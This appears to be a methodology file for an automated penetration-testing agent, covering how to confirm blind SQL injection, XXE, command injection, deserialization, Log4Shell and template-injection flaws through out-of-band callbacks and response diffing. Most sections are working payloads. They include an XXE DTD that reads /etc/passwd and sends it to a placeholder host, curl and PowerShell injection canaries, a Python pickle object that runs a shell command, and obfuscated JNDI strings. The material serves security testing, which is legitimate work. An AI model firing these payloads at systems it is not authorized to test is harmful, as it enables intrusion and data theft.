# The Blind-Vulnerability Playbook
## (Cross-Cutting Methodology — Use Alongside Class-Specific Files)

> Half of the vulns on real apps are blind. The bug-class methodologies
> tell you WHERE to inject; this file tells you HOW to confirm injection
> when there's no in-band signal.

The two primitives in this playbook are:
- **OOB callbacks** via `oob_get_domain` + `oob_poll`
- **Differential analysis** via `capture_baseline` + `diff_against_baseline`

---

## When to use which detector

| Scenario | Detector |
|----------|----------|
| Server fetches a URL we control | OOB |
| Server resolves a hostname we control | OOB (DNS) |
| Server runs a shell that touches the network | OOB |
| Boolean-blind condition (response shape changes) | Differential |
| Time-based blind (response delay changes) | Manual time test (5s gap) |
| Information disclosure (different fields surface) | Differential |
| Authz/IDOR (different user same response) | Differential + sessions |

If you don't know which: try OOB first. It's near-zero false positive.
Differential has more signal but more noise.

---

## Blind SQL Injection

### OOB-based exfiltration (DBMS-specific)
```
-- MySQL (LOAD_FILE/INTO OUTFILE rarely available, but...)
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\<oob>\\\\',version()))-- 

-- MSSQL
'; EXEC master..xp_dirtree '\\<oob>\share'-- 

-- Oracle
' || UTL_HTTP.REQUEST('http://<oob>/'||(SELECT user FROM dual))--
' || UTL_INADDR.GET_HOST_ADDRESS('<oob>')--

-- PostgreSQL
'; COPY (SELECT '') TO PROGRAM 'curl http://<oob>/'-- 
```

### Boolean-blind via differential
1. `capture_baseline("sqli-true", url="...?id=1' AND 1=1-- ")`
2. Probe `?id=1' AND 1=2-- ` and diff
3. Significant content delta → boolean condition matters → blind SQLi
4. Now extract one bit at a time:
   `?id=1' AND ASCII(SUBSTRING(database(),1,1))>64-- ` etc.

### Time-based via run_shell
```bash
time curl '...?id=1; SELECT pg_sleep(5)-- '
time curl '...?id=1; SELECT IF(1=1,sleep(5),0)-- '
```
Consistently 5s+ slower than baseline = time-based confirmed.

---

## Blind XXE

XXE without output is BLIND. Use OOB DTD pull:

### Step 1: Mint OOB
`oob_get_domain(label="xxe")` → token + domain

### Step 2: Host the malicious DTD
The simplest is to put the DTD on the OOB server (interactsh serves
configurable HTTP responses) OR host it inline:

```xml
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % d SYSTEM "http://<oob>/x.dtd">
  %d;
]>
<x>&exfil;</x>
```

If the OOB server responds with a useful DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://<oob>/?d=%file;'>">
%wrap;
```

Even just the initial fetch of `<oob>/x.dtd` confirms blind XXE — the
exfil escalation comes after.

### Step 3: Plant in any XML-accepting endpoint
- SOAP services
- SVG uploads (rendered server-side?)
- DOCX / XLSX / EPUB / SAML uploads
- RSS / Atom feed processors
- XHR with `Content-Type: application/xml`

---

## Blind Command Injection

```bash
# Probe canaries
; curl http://<oob>/cmd
| curl http://<oob>/pipe
& nslookup <oob> &
$(curl http://<oob>/subshell)
`curl http://<oob>/backtick`
%0Acurl%20http://<oob>/newline
```

For Windows targets:
```
& nslookup <oob>
& powershell -c iwr http://<oob>/
```

Plant in EVERY parameter that could plausibly hit a shell:
- Filename fields (`convert image.png`, `ffmpeg input.mp4`)
- Hostnames being pinged
- DNS lookup utilities exposed via web
- Backup/restore filenames
- "Test connection" buttons
- LDAP search filters

Each test = `oob_poll(token=<token>, timeout=15)`.

---

## Blind SSRF

Covered in `ssrf.md` — primary methodology IS OOB.

---

## Blind Deserialization

Most gadget chains do something networky on construction (file fetch, DNS
lookup, JNDI). For Java + ysoserial:
```bash
ysoserial URLDNS http://<oob>/ | base64 -w0
```
URLDNS is the simplest "did the server deserialize my object?" probe — it
just does a DNS lookup, doesn't try to RCE. Universally available.

For Python pickle:
```python
import pickle, base64
class P:
    def __reduce__(self):
        return (__import__('os').system, ('curl http://<oob>/',))
print(base64.b64encode(pickle.dumps(P())).decode())
```

---

## Blind Log4Shell / JNDI

```
${jndi:ldap://<oob>/x}
${jndi:dns://<oob>/x}
${${lower:jndi}:${lower:dns}://<oob>/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://<oob>/}
```
Plant in:
- User-Agent
- Referer
- X-Forwarded-For, X-Api-Version, every header
- Username field on login (logged before auth check)
- Search queries

---

## Blind SSTI

See `ssti.md` — but always pair RCE attempts with OOB:
```
{{ ''.__class__.__mro__[1].__subclasses__()[N]("curl http://<oob>/", shell=True) }}
```

If you don't know N, the "find subclass index by name" loop runs in many
templates:
```
{{ {}|map_attr('__class__')|...  }}    # Jinja2 specifically
```

---

## OOB Hygiene

- ALWAYS use a fresh token per hypothesis (`label="ssrf-userid-1"` then
  `label="ssrf-userid-2"`). Stale tokens get callbacks from previous
  payloads still in queue.
- After confirming a blind vuln, re-mint and confirm again before
  reporting — proves causal link, not noise.
- Long polls cost iteration budget. Prefer 10–20s polls; if nothing comes
  back, the payload variant probably doesn't fit (move on, don't increase).
- If the OOB tool reports `enabled=False`, fall back to time-based
  detection — many blinds are still findable via response delay.

---

## When OOB and differential BOTH fail

- Try error-based: deliberate syntax errors that leak engine fingerprints
- Try time-based: tight loop / sleep injections, baseline 50 quick
  requests then time the suspected-injection one
- Consider that the parameter might not actually reach the suspected sink

A vuln you can't confirm is INFORMATIONAL, not a finding. Demote and
move on rather than over-claim.
